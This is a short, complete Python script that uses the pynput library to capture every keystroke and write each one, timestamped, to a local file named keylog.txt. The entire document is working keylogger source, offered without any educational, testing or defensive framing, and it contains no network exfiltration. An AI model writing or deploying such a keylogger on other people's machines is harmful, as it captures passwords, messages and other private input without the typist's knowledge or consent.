import logging
from pynput import keyboard

# Set up logging to file
logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Define the callback function for when a key is pressed
def on_press(key):
    try:
        logging.info(str(key))
    except Exception as e:
        print(f"Error logging key: {e}")

# Set up and start the listener for keyboard events
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
